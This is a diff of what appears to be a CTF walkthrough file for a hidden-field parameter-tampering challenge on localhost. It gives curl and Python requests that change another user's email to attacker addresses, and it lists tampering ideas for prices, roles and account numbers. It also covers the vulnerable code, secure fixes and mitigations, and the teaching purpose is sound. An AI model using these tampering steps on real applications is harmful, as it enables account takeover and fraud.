@@ -16,11 +16,11 @@ tricks:
       # Visit http://localhost:80
       # Notice HTML comment: <!-- test:test -->
       # This reveals test credentials
-      
+
       # Login with:
       # Username: test
       # Password: test
-      
+
       # After login, redirected to /profile
       # Profile page shows:
       # - Welcome message with username
@@ -37,12 +37,12 @@ tricks:
           <input type="hidden" name="username" value="test">
           <button type="submit">Update Email</button>
       </form>
-      
+
       # Key observations:
       # 1. Hidden field contains username: value="test"
       # 2. Form submits both email and username to /profile
       # 3. Hidden fields are client-controlled!
-      
+
       # Common mistake:
       # Developers think hidden fields are "secure" because users don't see them
       # Reality: Anyone can modify hidden fields before submitting
@@ -54,9 +54,9 @@ tricks:
       POST /profile
       Content-Type: application/x-www-form-urlencoded
       Cookie: session=<valid_session>
-      
+
       email=newemail@test.com&username=test
-      
+
       # Response: "Email updated successfully!"
       # This confirms the feature works
       # But what if we change the username parameter?
@@ -70,24 +70,24 @@ tricks:
         -H "Content-Type: application/x-www-form-urlencoded" \
         -b "session=<your_session_cookie>" \
         -d "email=hacked@attacker.com&username=admin"
-      
+
       # Method 2: Using Python requests
       import requests
       session = requests.Session()
-      session.post('http://localhost:80/login', 
+      session.post('http://localhost:80/login',
                    data={'username': 'test', 'password': 'test'})
       response = session.post('http://localhost:80/profile',
-                             data={'email': 'pwned@evil.com', 
+                             data={'email': 'pwned@evil.com',
                                    'username': 'admin'})
       print(response.text)
-      
+
       # Method 3: Browser DevTools
       # 1. Open DevTools (F12)
       # 2. Go to Elements/Inspector tab
       # 3. Find: <input type="hidden" name="username" value="test">
       # 4. Double-click "test" and change to "admin"
       # 5. Submit the form
-      
+
       # Expected result: Admin's email is updated!
 
   - name: "Step 5: Get the flag"
@@ -96,10 +96,10 @@ tricks:
     payload: |
       # When admin's email is updated, server returns:
       # "Email updated successfully!FLAG{...}"
-      # 
+      #
       # The flag appears in the response message
       # Extract it from the HTML response
-      
+
       # Example response parsing:
       if "FLAG{" in response.text:
           flag_start = response.text.find("FLAG{")
@@ -117,25 +117,25 @@ tricks:
           # Gets username from POST data (WRONG!)
           username = request.form.get('username')
           new_email = request.form.get('email')
-          
+
           # Updates any user specified in the POST data
           update_email(username, new_email)
-          
+
           if username == "admin":
               return "Success!" + FLAG
-      
+
       # Why it's vulnerable:
       # 1. Server trusts client-provided username
       # 2. No check if session['username'] == POST username
       # 3. No authorization check if user can modify target
-      
+
       # Secure code pattern:
       @route('/profile', methods=['POST'])
       def profile():
           # Use session username (CORRECT!)
           username = session.get('username')
           new_email = request.form.get('email')
-          
+
           # Only update the authenticated user's email
           update_email(username, new_email)
 
@@ -144,23 +144,23 @@ tricks:
     how: "Identify related patterns"
     payload: |
       # Other common parameter tampering scenarios:
-      
+
       # 1. User ID in hidden field
       <input type="hidden" name="user_id" value="123">
       # Change to admin's ID to modify admin data
-      
+
       # 2. Price in hidden field
       <input type="hidden" name="price" value="99.99">
       # Change to 0.01 to buy items cheaply
-      
+
       # 3. Role/permissions in form
       <input type="hidden" name="role" value="user">
       # Change to "admin" for privilege escalation
-      
+
       # 4. Account number in transfer form
       <input type="hidden" name="from_account" value="12345">
       # Change to victim's account for unauthorized transfers
-      
+
       # General rule:
       # Any client-controlled data used for authorization = potential vulnerability
 
@@ -172,21 +172,21 @@ tricks:
       # - View page source
       # - Use browser DevTools
       # - Intercept with Burp Suite/OWASP ZAP
-      
+
       # Step 2: Understand what each field does
       # - Submit form normally
       # - Observe server behavior
       # - Check if field affects authorization
-      
+
       # Step 3: Test tampering
       # - Change field to different user
       # - Change field to admin/privileged value
       # - Change numeric IDs (try 1, 2, 100, etc.)
-      
+
       # Step 4: Check for horizontal privilege escalation
       # - Can you access/modify other users' data?
       # - Can you perform actions on behalf of others?
-      
+
       # Step 5: Check for vertical privilege escalation
       # - Can you gain admin privileges?
       # - Can you access admin-only functions?
@@ -199,26 +199,24 @@ tricks:
       # Always use server-side session data
       username = session['username']  # Good
       username = request.form['username']  # Bad
-      
+
       # 2. Implement proper authorization checks
       if session['username'] != target_username:
           if not is_admin(session['username']):
               return "Unauthorized", 403
-      
+
       # 3. Don't use hidden fields for security
       # Hidden fields are for UI convenience, not security
       # Use server-side sessions for sensitive data
-      
+
       # 4. Validate all input
       # Even if data comes from a hidden field
       # Verify it matches expected values
-      
+
       # 5. Use indirect object references
       # Instead of: user_id=123 in form
       # Use: session token that maps to user_id server-side
-      
+
       # 6. Log and monitor
       # Detect when users try to access others' resources
       # Alert on suspicious parameter modifications
-
-
